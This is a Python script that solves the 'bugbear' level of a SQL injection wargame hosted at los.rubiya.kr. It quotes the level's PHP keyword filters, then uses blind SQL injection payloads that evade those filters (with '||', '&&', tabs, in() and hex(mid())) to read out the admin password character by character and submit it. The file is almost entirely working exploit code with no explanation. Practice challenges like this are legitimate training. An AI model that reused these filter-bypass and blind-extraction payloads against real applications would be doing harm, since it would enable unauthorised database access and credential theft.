#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello admin' in args[0]


def main():
    """
    Bugbear

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");
    if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");
    if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe");
    $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear");
    """

    url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'no'

    payload = '0||length(pw)<%s&&id\tin("admin")#'
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    p.payload = f'0||id\tin("admin")&&hex(mid(pw,%d,1))<%s#'
    result = p.find_binary(check_func, len_of_key, coding='hex')

    p.inj_param = 'pw'
    p.payload = result
    response = p.my_request()

    if 'Clear!' in response:
        print('\nBugbear Clear!')


if __name__ == '__main__':
    main()
